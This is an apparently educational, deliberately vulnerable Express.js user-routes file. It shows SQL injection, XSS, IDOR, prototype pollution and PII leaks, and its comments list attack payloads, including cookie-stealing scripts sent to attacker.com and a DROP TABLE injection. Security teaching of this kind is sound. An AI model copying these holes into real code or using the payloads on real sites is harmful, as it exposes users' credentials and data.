/**
 * ⚠️  WARNING: INTENTIONALLY VULNERABLE - FOR EDUCATIONAL PURPOSES ONLY ⚠️
 *
 * VULNERABILITIES DEMONSTRATED IN THIS FILE:
 * ─────────────────────────────────────────────────────────────────────────────
 *  [IDOR-1]   Insecure Direct Object Reference — fetch any user by numeric ID
 *  [IDOR-2]   Insecure Direct Object Reference — update any user without auth
 *  [IDOR-3]   Insecure Direct Object Reference — delete any user without auth
 *  [XSS-1]    Reflected XSS — unsanitized search query rendered in HTML
 *  [XSS-2]    Stored XSS — unsanitized comment rendered as HTML
 *  [SQLI-1]   SQL Injection — user search via LIKE query
 *  [SQLI-2]   SQL Injection — field names injected into UPDATE SET clause
 *  [PROTO-1]  Prototype Pollution — lodash _.merge() with user-controlled input
 *  [MASS-1]   Mass Assignment — all body fields directly used in UPDATE
 *  [DISC-1]   Sensitive data disclosure — full user record (PII) returned
 *  [DISC-2]   SQL query string returned in error/success response
 *
 * ─────────────────────────────────────────────────────────────────────────────
 * Example attack payloads:
 *
 *  IDOR:        GET /users/1  (no auth required, gets admin record with SSN)
 *
 *  XSS:         GET /users/search?q=<script>alert(document.cookie)</script>
 *
 *  SQL Inject:  GET /users/search?q=' UNION SELECT 1,2,username,password,5,6,7,8,9,10 FROM users--
 *
 *  Prototype Pollution:
 *    POST /users/update-profile
 *    Body: { "__proto__": { "isAdmin": true }, "name": "evil" }
 */

'use strict';

const express = require('express');
const router  = express.Router();
const _       = require('lodash');   // lodash@4.17.4 — vulnerable to prototype pollution

const { getDb } = require('../db/init');

// ─────────────────────────────────────────────────────────────────────────────
// GET /users/search  (must be before /:id to avoid route conflict)
// VULNERABILITIES: Reflected XSS, SQL Injection
// ─────────────────────────────────────────────────────────────────────────────
router.get('/search', (req, res) => {
  const query = req.query.q || '';
  const db    = getDb();

  // [SQLI-1] VULNERABILITY: User-supplied value interpolated directly into SQL
  // Payload: q=' UNION SELECT 1,2,username,password,5,6,7,8,9,10 FROM users--
  const sql = `
    SELECT *
    FROM   users
    WHERE  username LIKE '%${query}%'
    OR     email    LIKE '%${query}%'
  `;

  db.all(sql, (err, users) => {
    if (err) {
      return res.status(500).json({ error: err.message, query: sql });
    }

    // [XSS-1] VULNERABILITY: User-supplied `query` reflected into HTML with no encoding
    // Payload: q=<script>fetch('http://attacker.com/?c='+document.cookie)</script>
    res.send(`
      <!DOCTYPE html>
      <html>
        <head><title>User Search</title></head>
        <body>
          <h1>Search results for: ${query}</h1>
          <p>Found ${users.length} user(s)</p>
          <pre>${JSON.stringify(users, null, 2)}</pre>
        </body>
      </html>
    `);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// GET /users/:id
// VULNERABILITY: IDOR — no authentication or authorization check
// ─────────────────────────────────────────────────────────────────────────────
router.get('/:id', (req, res) => {
  const db     = getDb();
  const userId = req.params.id;   // No session/auth check

  // [IDOR-1] VULNERABILITY: Any anonymous caller can retrieve any user record
  // /users/1 → admin record with password hash, SSN, credit card, API key
  db.get(`SELECT * FROM users WHERE id = ${userId}`, (err, user) => {
    if (err)   return res.status(500).json({ error: err.message });
    if (!user) return res.status(404).json({ error: 'User not found' });

    // [DISC-1] VULNERABILITY: Returns ALL columns including password hash, SSN, credit card
    res.json(user);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// POST /users/update-profile
// VULNERABILITY: Prototype Pollution via lodash _.merge
// ─────────────────────────────────────────────────────────────────────────────
router.post('/update-profile', (req, res) => {
  const userInput  = req.body;
  let userProfile  = { name: 'Guest', role: 'user', isAdmin: false };

  // [PROTO-1] VULNERABILITY: _.merge() with unsanitized user input
  // Lodash 4.17.4 is vulnerable to prototype pollution
  // Payload: { "__proto__": { "isAdmin": true } }
  // After merge, ALL objects will have isAdmin = true via prototype chain
  _.merge(userProfile, userInput);

  // This check can be bypassed via prototype pollution
  if (({}).isAdmin) {
    return res.json({
      message: '⚠️ Prototype pollution succeeded — ({}).isAdmin is now true!',
      profile: userProfile,
      objectProto: Object.prototype
    });
  }

  res.json({ message: 'Profile updated', profile: userProfile });
});

// ─────────────────────────────────────────────────────────────────────────────
// PUT /users/:id
// VULNERABILITIES: IDOR, Mass Assignment, SQL Injection via field names
// ─────────────────────────────────────────────────────────────────────────────
router.put('/:id', (req, res) => {
  const db      = getDb();
  const userId  = req.params.id;
  const updates = req.body;

  // [IDOR-2] VULNERABILITY: No auth check — anyone can update any user
  // [MASS-1] VULNERABILITY: All fields from request body used directly
  // [SQLI-2] VULNERABILITY: Field names (keys) interpolated into SQL — SQL injection via column name
  // Payload: body = { "role": "admin" }   → privilege escalation
  // Payload: body = { "1=1; DROP TABLE users; --": "x" }
  const setClause = Object.keys(updates)
    .map(key => `${key} = '${updates[key]}'`)  // Both key AND value unsanitized
    .join(', ');

  const query = `UPDATE users SET ${setClause} WHERE id = ${userId}`;

  db.run(query, function (err) {
    if (err) return res.status(500).json({ error: err.message, query });
    // [DISC-2] VULNERABILITY: Returns the raw SQL query to client
    res.json({ message: 'User updated', rowsAffected: this.changes, query });
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// DELETE /users/:id
// VULNERABILITY: IDOR — no authentication, anyone can delete any account
// ─────────────────────────────────────────────────────────────────────────────
router.delete('/:id', (req, res) => {
  const db     = getDb();
  const userId = req.params.id;

  // [IDOR-3] VULNERABILITY: No authentication — any caller can delete any user
  db.run(`DELETE FROM users WHERE id = ${userId}`, function (err) {
    if (err) return res.status(500).json({ error: err.message });
    res.json({ message: `User ${userId} deleted`, rowsAffected: this.changes });
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// POST /users/comment
// VULNERABILITY: Stored / Reflected XSS — user HTML rendered without encoding
// ─────────────────────────────────────────────────────────────────────────────
router.post('/comment', (req, res) => {
  const { comment, author } = req.body;

  // [XSS-2] VULNERABILITY: Unsanitized user input rendered as raw HTML
  // In a real app this would be persisted to DB and served to other users
  // Payload: comment = <script>document.location='http://attacker.com/?c='+document.cookie</script>
  // Payload: comment = <img src=x onerror="alert('XSS')">
  res.send(`
    <!DOCTYPE html>
    <html>
      <head><title>Comments</title></head>
      <body>
        <div class="comment-box">
          <strong>${author}</strong> says:
          <p>${comment}</p>
        </div>
      </body>
    </html>
  `);
});

// ─────────────────────────────────────────────────────────────────────────────
// GET /users/
// VULNERABILITY: Returns all users including sensitive fields — no pagination,
//               no field filtering, no auth
// ─────────────────────────────────────────────────────────────────────────────
router.get('/', (req, res) => {
  const db = getDb();

  // [DISC-1] VULNERABILITY: Dumps entire users table including PII
  db.all('SELECT * FROM users', (err, users) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json({ count: users.length, users });  // Password hashes, SSNs, credit cards all exposed
  });
});

module.exports = router;
